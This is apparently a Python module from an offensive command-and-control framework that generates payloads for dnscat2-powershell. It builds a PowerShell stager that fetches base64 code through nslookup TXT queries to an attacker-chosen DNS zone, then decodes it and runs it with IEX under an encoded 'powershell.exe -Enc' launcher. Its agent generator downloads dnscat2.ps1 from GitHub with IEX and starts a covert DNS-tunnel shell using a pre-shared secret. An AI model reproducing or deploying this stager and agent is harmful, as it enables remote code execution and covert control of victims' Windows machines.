from helpers.files import sanatizefilename
from helpers.log import *
import helpers.strings as helps
from ..platform import Platform
from helpers.modulebase import ModuleBase

DEBUG_MODULE = "PlatformDnsCat2Wrapper"

class PlatformDnsCat2Wrapper(Platform, ModuleBase):
    """
    platform code to provide a stager and an agent generator for dnscat2 with powershell
    """

    # noinspection PyMissingConstructor
    def __init__(self, handler):
        """
        dnscat2 with powershell plattform code
        """

        self.options = {
            'STAGED': {
                'Description': 'Is the communication setup staged or not?',
                'Required': True,
                'Value': "TRUE",
                'Options': ("TRUE", "FALSE")
            }
        }
        self.handler = handler
        # secret for the dnscat connection process
        self.secret = helps.random_string(20)

    def setoption(self, name, value):
        """
        Sets option to value if possible.
        """

        return ModuleBase.setoption(self, name, value)

    def validate_options(self):
        """
        validate the options for the platform
        """

        return ModuleBase.validate_options(self)

    def isstaged(self):
        """
        platform can be staged by setting the option
        """

        return self.options['STAGED']['Value'] == "TRUE"

    def getstager(self):
        """
        Generate the stager string
        """

        if not self.isstaged():
            print_error("Platform is not staged. Consider changing option STAGED or generating agent directly.")
            return None
        if not self.handler.transport:
            print_error("Transport not set")
            return None
        if self.handler.options["TRANSPORT"]["Value"] != "DNS":
            print_error("dnscat2 must be used with DNS transport, hence the name!")
            return None

        if self.handler.options['TRANSPORT']['Value'] == "DNS":
            zone = self.handler.transport.options['ZONE']['Value'].rstrip(".")
            server = self.handler.transport.options['DNSSERVER']['Value']
            print_debug(DEBUG_MODULE, "zone = {}, server = {}".format(zone, server))
            if server is None:
                server = ""

            # TODO: Consider using helps.randomize_capitalization(...)
            stager = '$error.clear();$a="";'
            stager += 'for($i=0;$i -ge 0;$i++){'
            stager += '$a+=([string](IEX "nslookup -type=TXT s$($i).{}. {}")).Split({})[1];'.format(zone, server, "'\"'")
            # IP: ([System.Net.DNS]::GetHostEntry("ptfs.sy.gs")).AddressList[0].IPAddressToString
            stager += 'if($error.Count -ge 1){$i=-7;}}'
            #stager += '$f=$c.IndexOf('"')+1;$l=$c.LastIndexOf('"')-$f;'
            #stager += '$p+=$c.Substring($f,$l);}'
            stager += '$a=[Convert]::FromBase64String($a);'
            stager += '$s=New-Object String($a,0,$a.Length);'
            stager += '"GOAGENT";IEX $s;'

            print_debug(DEBUG_MODULE, "stager = {}".format(stager))
            return helps.powershell_launcher(stager, baseCmd="powershell.exe -Enc ")  # TODO: baseCmd

        # combination platform / transport currently not supported
        else:
            print_error("No stager for platform and transport found.")
            return None

    def getagent(self):
        """
        Return the full dnscat2-powershell agent string
        """

        if self.handler.options["TRANSPORT"]["Value"] != "DNS":
            print_error("dnscat2 must be used with DNS transport, hence the name!")
            return None

        # load agent from file dnscat2-powershell
        f = open(sanatizefilename("$TOOLPATH/thirdpartytools/dnscat2-powershell/dnscat2.ps1"), 'r')
        agent = f.read()
        f.close()

        # or if you do not want to wait for ever for testing, TODO: remove
        agent = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');"

        zone = self.handler.transport.options['ZONE']['Value'].rstrip(".")
        server = self.handler.transport.options['DNSSERVER']['Value']
        print_debug(DEBUG_MODULE, "zone = {}, server = {}".format(zone, server))
        if server is None:
            server = ""
        else:
            server = " -DNSServer "+str(server)

        # add execution with zone and pre shared secret
        agent += "Start-Dnscat2 -Domain {}{} -PreSharedSecret \"{}\";".format(zone, server, self.secret)

        # strip comments and empty lines
        agent = helps.strip_powershell_comments(agent)

        # ok, lets encode the agent
        agent = agent.encode('utf-8')
        print_debug(DEBUG_MODULE, "len(real agent) = {}".format(len(agent)))

        return agent
